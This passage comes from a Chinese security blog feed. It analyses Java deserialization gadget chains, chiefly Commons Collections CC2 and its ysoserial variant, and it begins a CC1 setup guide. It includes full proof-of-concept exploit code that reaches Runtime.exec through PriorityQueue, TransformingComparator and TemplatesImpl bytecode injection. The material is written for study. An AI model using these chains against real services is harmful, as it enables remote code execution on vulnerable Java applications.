&#125;</span><br></pre></td></tr></table></figure><p>首先会判断是否存在<code>comparator</code>比较器，比较器存在就调用<code>siftDownUsingComparator</code>方法，不存在比较器就调用<code>siftDownComparable</code>方法，按逆推调用链的话就必须存在比较器，才能去调用<code>siftDownUsingComparator</code>方法<br>最后在<code>siftDownUsingComparator</code>方法中调用比较器的<code>compare</code>方法</p><p><img src="/posts/7e30cd4a/cc2-22.png" title="compare方法"></p><p>其中针对<code>PriorityQueue</code>类中的各个方法源码含义<br>可查看相关方法注解：<a href="https://www.cnblogs.com/freeorange/p/11405227.html">https://www.cnblogs.com/freeorange/p/11405227.html</a></p><h2 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h2><p>在cc1后半段基础上补充cc2的利用链，就形成完整利用链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  -PriorityQueue.readObject()</span><br><span class="line">    -PriorityQueue.heapify()</span><br><span class="line">      -PriorityQueue.siftDown()</span><br><span class="line">        -PriorityQueue.siftDownUsingComparator()</span><br><span class="line">          -TransformingComparator.compare()</span><br><span class="line">            -ChainedTransformer.transform()</span><br><span class="line">              -ConstantTransformer.transform()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Class.getMethod()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.getRuntime()</span><br><span class="line">              -InvokerTransformer.transform()</span><br><span class="line">                -Method.invoke()</span><br><span class="line">                  -Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h2><p>利用链后半段用的cc1的后半段，可直接拿过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>然后创建比较器，为了调用<code>TransformingComparator</code>的<code>comare</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br></pre></td></tr></table></figure><p>比较器创建好了，再创建PriorityQueue队列，引入上面的<code>TransformingComparator</code>比较器，这里有两种利用方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器</span></span><br><span class="line">PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(pq,cp);</span><br></pre></td></tr></table></figure><p>然后给<code>PriorityQueue</code>队列添加元素，分析过程的时候提到队列数组size大小必须大于等于2，所以这里添加元素最少要添加2个，才能触发利用链的方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pq.add(<span class="number">1</span>);</span><br><span class="line">pq.add(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>最后序列化<code>PriorityQueue</code>对象，再反序列化触发漏洞。</p><p>最后POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器，该方法调试会抛出异常</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line">        <span class="comment">//PriorityQueue pq=new PriorityQueue(2);</span></span><br><span class="line">        <span class="comment">//pq.add(1);</span></span><br><span class="line">        <span class="comment">//pq.add(2);</span></span><br><span class="line">        <span class="comment">//Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);</span></span><br><span class="line">        <span class="comment">//field.setAccessible(true);</span></span><br><span class="line">        <span class="comment">//field.set(pq,cp);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化PriorityQueue对象</span></span><br><span class="line">            ObjectOutputStream out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            out.writeObject(pq);</span><br><span class="line">            <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">            ObjectInputStream os=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            os.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行实现</p><p><img src="/posts/7e30cd4a/cc2-23.png" title="POC执行"></p><p>运行报错原因：</p><p>这里提示有报错，原因是添加的元素无法通过指定的比较器进行比较，从而抛出的异常（添加的元素为数字，比较器为ChainedTransformer对象，两者没有关联关系，自然无法通过该比较器对数值进行比较），但利用链能全部调用，达到执行的效果。</p><p>调试报错原因：</p><p>在调试过程中发现，第一种方式无法进行反序列化步骤的调试，调试会直接抛出异常，因为在声明PriorityQueue对象时先传递入比较器，在添加元素时，会自动引入比较器进行比较，因为无法比较，所以编译文件时直接抛出异常，无法进行调试。<br>而第二种是先声明PriorityQueue对象，添加元素 再通过反射去调用设置比较器，因此可以调试到反序列化的步骤，到最后再进行比较的时候出错再抛出异常。<br>（引用反射的知识，动态调用在用到该反射的时候出错才会抛出异常，而普通用法会在编译的时候会直接调用出错就抛出异常）</p><h1 id="0x05、CC2-yso利用链分析"><a href="#0x05、CC2-yso利用链分析" class="headerlink" title="0x05、CC2-yso利用链分析"></a>0x05、CC2-yso利用链分析</h1><h2 id="分析简述"><a href="#分析简述" class="headerlink" title="分析简述"></a>分析简述</h2><p>在yso利用链中，并没有使用上文cc2链分析的方法，加入了<code>javassist</code>和<code>TemplatesImpl</code>，通过<code>javassist</code>生成恶意字节码，再通过<code>TemplatesImpl</code>加载字节码返回类对象并实例化，通过上文基础知识对<strong>TemplatesImpl</strong>的了解，重点就在找到一个方法可以调用<code>getOutputProperties()</code>或者<code>newTransformer()</code>方法，去执行恶意代码。</p><p>到这也只有正向分析poc来查找调用关系</p><p>yso链的主要利用就是通过PriorityQueue优先级队列设置比较器，将InvokerTransformer(String methodName)方法作为比较器传递入PriorityQueue队列，其中在InvokerTransformer(String methodName)构造函数中传递newTransformer()方法作为参数。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>主体部分，javassist生成字节码，然后<code>TemplatesImpl</code>填充对应满足条件，可以直接先把上文中<code>TemplatesImpl</code>基础知识的实现demo搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下一步，主体构造有了，但是需要有入口能调用<code>TemplatesImpl</code>对象的<code>newTransformer()</code>方法</p><p>通过<code>InvokerTransformer(String methodName)</code>方法调用<code>newTransformer()</code>方法或者<code>getOutputProperties()</code>方法都行</p><p><img src="/posts/7e30cd4a/cc2-36.png" title="InvokerTransformer"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>getOutputProperties()</code>方法名传递进<code>invokerTransformer</code>对象了，接下来就是跟CC2链分析的调用情况一样，设置比较器，将<code>invokerTransformer</code>作为比较器赋值给<code>TransformingComparator</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法,再通过,执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure><p>比较器有了，现在创建PriorityQueue队列，通过反射设置size大小以及比较器，由CC2分析的时候知道调用compare方法是关键，因为跟上文的cc2调用情况不一样，上文调用了<code>ChainedTransformer</code>类把恶意代码执行串起来了，因此队列add进去的参数无所谓</p><p>但这个cc2-yso调用是先设置<code>InvokerTransformer(String methodName)</code>构造函数传递入<code>getOutputProperties</code>方法，最后再通过compare传递入TemplatesImpl对象来调用，相当于执行<code>InvokerTransformer.transform(TemplatesImpl)</code>，最后执行效果为<code>TemplatesImpl.getOutputProperties()</code>达到目的</p><p><img src="/posts/7e30cd4a/cc2-37.png" title="compare"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br></pre></td></tr></table></figure><p>结合以上得到最后的poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素，需要将templates对象传入，目的调用InvokerTransformer.transform(TemplatesImpl)</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现demo：<br><img src="/posts/7e30cd4a/cc2-38.png" title="实现demo"></p><p>其中报错跟上文cc2分析和<code>TemplatesImpl</code>类学习的报错一样就不再赘述了</p><h1 id="0x06、总结"><a href="#0x06、总结" class="headerlink" title="0x06、总结"></a>0x06、总结</h1><p>总的来说cc2-yso链比普通链复杂了很多，其中也学习了javassist生成字节码，再到TemplatesImpl去读取字节码实例化，最后结合优先级队列实现命令执行。<br>绕来绕去这中间确实花了不少时间，有些调用细节还是需要多看一下才能发现精髓（也确实费时间），但对调用的很多类都还没有从jdk源码上真正明白他们每个类的每个方法是实现怎样的作用，只从利用链角度去了解了调用到的链的类的相关原理，后面尽量多去了解那些类的原理。</p><h1 id="0x07、参考链接"><a href="#0x07、参考链接" class="headerlink" title="0x07、参考链接"></a>0x07、参考链接</h1><p><a href="https://www.cnblogs.com/nice0e3/p/13811335.html">https://www.cnblogs.com/nice0e3/p/13811335.html</a><br><a href="https://www.cnblogs.com/hlkawa/p/15383289.html">https://www.cnblogs.com/hlkawa/p/15383289.html</a><br><a href="https://www.jianshu.com/p/cb591a12f50c">https://www.jianshu.com/p/cb591a12f50c</a><br><a href="https://paper.seebug.org/1242/#commonscollections-2">https://paper.seebug.org/1242/#commonscollections-2</a><br><a href="https://www.anquanke.com/post/id/247044?from=timeline#h2-0">https://www.anquanke.com/post/id/247044?from=timeline#h2-0</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC1链学习与分析</title>
      <link href="/posts/dd664be3.html"/>
      <url>/posts/dd664be3.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><p>CC1链分为两条链，一条为<code>TransformedMap</code>(也是最初的CC1链)，一条为<code>LazyMap</code>，其中有的分析把<code>TransformedMap</code>链单独分出来作为CC链，把<code>LazyMap</code>链作为CC1链。也可以作为CC1的两条链，一起学习下。</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66(cc1链要求java版本小于jdk8u71,不得不说这个版本确实有点老了)<br><br>jdk官方下载链接：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html%EF%BC%8C%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E4%BD%8E%E4%BA%8E8u71%E7%9A%84%E5%B0%B1%E8%A1%8C%E3%80%82">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html，找到对应版本低于8u71的就行。</a></p><p><strong>添加Maven项目</strong><br>新建Maven项目——&gt;pom.xml添加Commons Collections组件依赖,3系列除3.2.2版本外，其余均收该漏洞影响，添加3系列其中一个版本即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-1.png" title="maven环境"></p><p><strong>导入sun包</strong></p><blockquote><p>因为cc1链需要用到sun包中的类，sun包在jdk中的代码是通过class文件反编译来的，为.class文件，查看不到源码.java文件，不便于调试，且直接观看class文件的阅读性跟java文件有出入，所以下载jdk源码sun包导入，便可查看到java源码文件，方便调试阅读</p></blockquote><p>步骤:<br>下载jdk源码：<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk</a><br>按网上步骤解压出src文件夹，再把&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun文件夹放到解压出来的src文件夹根目录</p><p><img src="/posts/dd664be3/cc1-2.png" title="sun环境"><br><img src="/posts/dd664be3/cc1-3.png" title="sun环境"></p><p>在项目结构中对应jdk版本下添加包即可如下图</p><p><img src="/posts/dd664be3/cc1-4.png" title="sun环境"></p><p>随后在分析过程对应maven里Commons Collections包的class文件上方提示下载源代码，下载就可以看到Commons Collections包的java源码</p><p><img src="/posts/dd664be3/cc1-5.png" title="查看到源码"></p><h1 